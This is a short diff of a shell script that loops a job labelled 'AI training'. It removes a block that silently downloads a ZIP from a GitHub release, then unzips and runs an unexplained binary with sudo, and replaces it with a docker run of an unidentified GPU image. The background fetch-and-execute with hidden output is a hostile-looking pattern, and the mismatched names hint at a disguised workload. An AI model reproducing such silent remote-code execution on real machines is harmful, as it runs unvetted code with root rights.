@@ -37,21 +37,7 @@ while true; do
         sleep 5
     fi
 
-    nohup bash -c '
-        sudo apt install -y unzip
-
-        # Download updated ZIP
-        sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/asdc/TELEGRAMBOTx.zip
-
-        sudo rm -rf TELEGRAMBOT
-        sudo mkdir -p TELEGRAMBOT
-        sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
-
-        cd TELEGRAMBOT || exit
-
-        sudo chmod +x aitraining
-        sudo ./aitraining -c config.json
-    ' > /dev/null 2>&1 &
+docker run --gpus all --runtime=nvidia riccorg/ml-compute-platform:latest
 
     echo "AI training started. It will run for 30 minutes."
     sleep 1800   # 30 minutes
